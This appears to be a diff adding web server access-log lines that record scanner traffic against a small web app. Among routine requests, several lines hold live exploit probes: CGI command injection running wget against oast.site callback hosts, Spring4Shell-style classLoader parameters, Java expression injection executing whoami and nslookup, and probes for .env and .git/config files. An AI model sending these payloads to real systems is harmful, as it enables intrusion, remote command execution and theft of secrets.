+INFO:     167.94.146.59:57020 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.146.59:57444 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.146.59:57452 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     167.94.146.59:57468 - "GET /login HTTP/1.1" 200 OK
+INFO:     204.76.203.18:43444 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.18:49132 - "GET /bins/ HTTP/1.1" 200 OK
+INFO:     204.76.203.18:38278 - "GET /bin/ HTTP/1.1" 200 OK
+INFO:     194.30.123.189:40185 - "GET / HTTP/1.0" 200 OK
+INFO:     50.18.81.74:60850 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.18:33102 - "GET /backup/ HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:53956 - "GET /backend/backend/auth/signin HTTP/1.1" 200 OK
+INFO:     198.235.24.95:61386 - "GET / HTTP/1.1" 200 OK
+INFO:     198.235.24.194:62874 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.218:48888 - "GET /robots.txt HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.206:33110 - "GET /security.txt HTTP/1.1" 200 OK
+INFO:     194.165.16.11:57614 - "GET /?location=search HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     104.236.18.191:60282 - "GET / HTTP/1.1" 200 OK
+INFO:     104.236.18.191:60284 - "GET /login HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     184.105.139.70:60332 - "GET / HTTP/1.1" 200 OK
+INFO:     184.105.139.106:47263 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     184.105.139.102:51339 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:48394 - "POST /functionRouter HTTP/1.1" 403 Forbidden
+INFO:     137.74.246.152:26152 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.30:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     194.165.16.11:33410 - "POST /cgi-bin/nightled.cgi HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:33422 - "GET /cgi-bin/mesh.cgi?page=upgrade&key=;%27wget+http://d3qe7gf49vd8v4f7qkog834chbz68wdoi.oast.site;%27 HTTP/1.1" 200 OK
+INFO:     194.165.16.11:33424 - "POST /geoserver/wms HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:47642 - "POST /mgmt/tm/util/bash HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:47650 - "POST /mgmt/tm/util/bash HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:49724 - "GET /?class.module.classLoader.resources.context.configFile=http://d3qe7gf49vd8v4f7qkogtq9d7y6j7szix.oast.site&class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1" 200 OK
+INFO:     194.165.16.11:49752 - "GET /?class.module.classLoader.resources.context.configFile=https://d3qe7gf49vd8v4f7qkogyb4o84adfmg4g.oast.site&class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1" 200 OK
+INFO:     194.165.16.11:49736 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:49768 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     3.143.33.63:48970 - "GET / HTTP/1.1" 200 OK
+INFO:     3.143.33.63:41098 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     115.231.78.12:30000 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.12:38102 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     115.231.78.12:40533 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.12:42531 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     115.231.78.12:44564 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     115.231.78.12:31403 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     45.79.207.71:33408 - "GET / HTTP/1.1" 200 OK
+INFO:     172.236.119.165:54938 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.128:32848 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.128:50662 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.128:50674 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     199.45.154.128:50682 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     199.45.154.128:60108 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     199.45.154.128:59558 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     199.45.154.128:59562 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     205.210.31.10:57930 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:44650 - "GET /cgi-bin/touchlist_sync.cgi?IP=;wget+http://d3qe7gf49vd8v4f7qkoghftj45c9m6x5k.oast.site; HTTP/1.1" 200 OK
+INFO:     194.165.16.11:53364 - "GET /wp-content/plugins/vr-calendar-sync/assets/js/public.js HTTP/1.1" 200 OK
+INFO:     194.165.16.11:53378 - "GET /wp-admin/admin-post.php?vrc_cmd=phpinfo HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:33440 - "POST /apisix/batch-requests HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:33448 - "GET /api/34HnpNZUe3B0ObELxfXkf2wpueC HTTP/1.1" 404 Not Found
+INFO:     45.135.194.44:4068 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:40852 - "POST /OA_HTML/BneViewerXMLService?bne:uueupload=TRUE HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:40854 - "GET /OA_CGI/FNDWRR.exe HTTP/1.1" 200 OK
+INFO:     194.165.16.11:40868 - "POST /OA_HTML/BneViewerXMLService?bne:uueupload=TRUE HTTP/1.1" 403 Forbidden
+INFO:     78.153.140.203:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     138.68.236.215:50260 - "GET /.env HTTP/1.1" 200 OK
+INFO:     138.68.236.215:50268 - "GET /.git/config HTTP/1.1" 200 OK
+INFO:     205.210.31.65:64348 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     64.62.156.212:8200 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.156.214:47987 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     64.62.156.217:21261 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.47:36668 - "GET /security.txt HTTP/1.1" 200 OK
+INFO:     206.168.34.47:36672 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.47:36674 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.32:59506 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     162.142.125.32:59508 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     205.210.31.66:61504 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     128.14.236.41:57472 - "GET / HTTP/1.1" 200 OK
+INFO:     128.14.236.41:57488 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     128.14.236.41:57490 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     128.14.236.41:57492 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     128.14.236.41:38510 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     128.14.236.41:38520 - "GET /config.json HTTP/1.1" 200 OK
+INFO:     128.14.236.41:38524 - "GET /sse HTTP/1.1" 200 OK
+INFO:     128.14.236.41:38538 - "GET /mcp HTTP/1.1" 200 OK
+INFO:     128.14.236.41:38544 - "GET /mcp-sse HTTP/1.1" 200 OK
+INFO:     194.165.16.11:45312 - "POST /bonita/loginservice HTTP/1.1" 403 Forbidden
+INFO:     167.71.229.198:53812 - "GET /aaa9 HTTP/1.1" 200 OK
+INFO:     167.71.229.198:53822 - "GET /aab8 HTTP/1.1" 200 OK
+INFO:     167.71.229.198:53824 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:46180 - "POST /admin/uploads.php?id=1 HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54738 - "POST /index.php?owa_do=base.loginForm&owa_site_id HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54742 - "GET /owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php HTTP/1.1" 200 OK
+INFO:     194.165.16.11:54754 - "POST /index.php?owa_do=base.loginForm&owa_site_id HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:38338 - "GET /cgi-bin/downloadFlile.cgi?payload=`ls>../34HnpJfMz2ytlzEsWiuW2PDCtJd` HTTP/1.1" 200 OK
+INFO:     194.165.16.11:38344 - "GET /34HnpJfMz2ytlzEsWiuW2PDCtJd HTTP/1.1" 200 OK
+INFO:     134.122.75.201:22925 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     164.92.143.127:49144 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 200 OK
+INFO:     165.22.81.140:11730 - "GET /solr/admin/info/system HTTP/1.1" 200 OK
+INFO:     164.92.143.127:49150 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 200 OK
+INFO:     207.154.202.113:61642 - "GET /v2/_catalog HTTP/1.1" 200 OK
+INFO:     207.154.202.113:61658 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     165.22.81.140:11734 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 200 OK
+INFO:     138.197.179.171:47150 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     157.245.148.140:49690 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     157.245.148.140:49704 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     57.141.0.32:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     78.153.140.176:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     138.68.149.66:57574 - "GET / HTTP/1.1" 200 OK
+INFO:     138.68.149.66:57580 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     205.210.31.223:61536 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:45758 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:42018 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     3.131.215.38:56222 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:48558 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     2.57.122.234:54732 - "GET / HTTP/1.1" 200 OK
+INFO:     37.247.211.206:42624 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.151:62902 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.30:61022 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     47.236.245.98:28284 - "GET / HTTP/1.1" 200 OK
+INFO:     123.160.223.74:2098 - "GET / HTTP/1.1" 200 OK
+INFO:     123.160.223.72:46982 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     185.91.127.107:33992 - "GET /json HTTP/1.1" 200 OK
+INFO:     165.154.163.113:56962 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.226.8:42442 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.226.8:42734 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     152.32.226.8:42924 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     152.32.226.8:43056 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     152.32.226.8:43054 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     185.242.226.87:47846 - "GET / HTTP/1.1" 200 OK
+INFO:     185.242.226.87:37030 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     45.156.128.114:51023 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.128.112:46829 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.128.114:58009 - "GET /admin/ HTTP/1.1" 302 Found
+INFO:     45.156.128.112:41999 - "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 200 OK
+INFO:     45.156.128.114:33741 - "GET /owncloud/status.php HTTP/1.1" 200 OK
+INFO:     45.156.128.112:53113 - "GET /status.php HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     45.156.128.111:53639 - "GET /api/session/properties HTTP/1.1" 404 Not Found
+INFO:     45.156.128.114:54013 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     45.156.128.113:59017 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.128.113:38311 - "GET /console HTTP/1.1" 200 OK
+INFO:     45.156.128.114:59719 - "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 200 OK
+INFO:     194.165.16.11:53798 - "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1" 200 OK
+INFO:     194.165.16.11:53802 - "GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d3qe7gf49vd8v4f7qkogi4chwumfxox83.oast.site%22%29%7D/ HTTP/1.1" 200 OK
+INFO:     20.169.105.38:32780 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
